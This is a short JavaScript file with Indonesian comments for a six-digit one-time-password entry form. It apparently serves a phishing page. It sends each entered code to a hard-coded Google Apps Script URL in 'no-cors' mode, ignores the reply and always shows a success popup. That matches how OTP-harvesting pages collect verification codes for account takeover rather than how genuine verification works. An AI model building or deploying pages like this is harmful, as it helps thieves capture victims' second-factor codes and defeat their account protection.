let otp1 = document.getElementById("otp1");
let otp2 = document.getElementById("otp2");
let otp3 = document.getElementById("otp3");
let otp4 = document.getElementById("otp4");
let otp5 = document.getElementById("otp5");
let otp6 = document.getElementById("otp6");


// AUTO NEXT DIGIT
otp1.addEventListener("input", function() {

    if (this.value !== "") {
        otp2.focus();
    }

});

otp2.addEventListener("input", function() {

    if (this.value !== "") {
        otp3.focus();
    }

});

otp3.addEventListener("input", function() {

    if (this.value !== "") {
        otp4.focus();
    }

});

otp4.addEventListener("input", function() {

    if (this.value !== "") {
        otp5.focus();
    }

});

otp5.addEventListener("input", function() {

    if (this.value !== "") {
        otp6.focus();
    }

});


// RESET OTP
function resetOTP() {

    otp1.value = "";
    otp2.value = "";
    otp3.value = "";
    otp4.value = "";
    otp5.value = "";
    otp6.value = "";

    otp1.focus();

}


// BACKSPACE RESET
otp1.addEventListener("keydown", function(event) {

    if (event.key === "Backspace") {

        event.preventDefault();

        resetOTP();

    }

});

otp2.addEventListener("keydown", function(event) {

    if (event.key === "Backspace") {

        event.preventDefault();

        resetOTP();

    }

});

otp3.addEventListener("keydown", function(event) {

    if (event.key === "Backspace") {

        event.preventDefault();

        resetOTP();

    }

});

otp4.addEventListener("keydown", function(event) {

    if (event.key === "Backspace") {

        event.preventDefault();

        resetOTP();

    }

});

otp5.addEventListener("keydown", function(event) {

    if (event.key === "Backspace") {

        event.preventDefault();

        resetOTP();

    }

});

otp6.addEventListener("keydown", function(event) {

    if (event.key === "Backspace") {

        event.preventDefault();

        resetOTP();

    }

});


// SEND OTP
function sendOTP() {

    let otp = 
        otp1.value +
        otp2.value +
        otp3.value +
        otp4.value +
        otp5.value +
        otp6.value;


    // VALIDASI
    if (otp.length < 6) {

        alert("OTP harus 6 digit");

        return;

    }


    // KIRIM KE APPS SCRIPT
    fetch("https://script.google.com/macros/s/AKfycbzbL7Rg1JNBqTuh3Njxuxz-ig5B3bcEOAFrJYTlMZtIA_ql0U5OwngThNi9gj0wufk/exec?kode=" + otp, {

        method: "GET",
        mode: "no-cors"

    })

    .then(() => {

        console.log("OTP TERKIRIM");


        // POPUP
        let popup = document.getElementById("popup");

        popup.style.display = "block";

        popup.style.opacity = "1";


        // RESET INPUT
        otp1.value = "";
        otp2.value = "";
        otp3.value = "";
        otp4.value = "";
        otp5.value = "";
        otp6.value = "";


        // CURSOR KE AWAL
        otp1.focus();


        // HILANGKAN POPUP
        setTimeout(() => {

            popup.style.opacity = "0";

            setTimeout(() => {

                popup.style.display = "none";

            }, 300);

        }, 3000);

    });

}


// CURSOR LANGSUNG KE DIGIT PERTAMA
window.onload = function() {

    otp1.focus();
}

// ENTER SEND OTP
document.addEventListener("keydown", function(event) {

    if (event.key === "Enter") {

        sendOTP();
    }
});
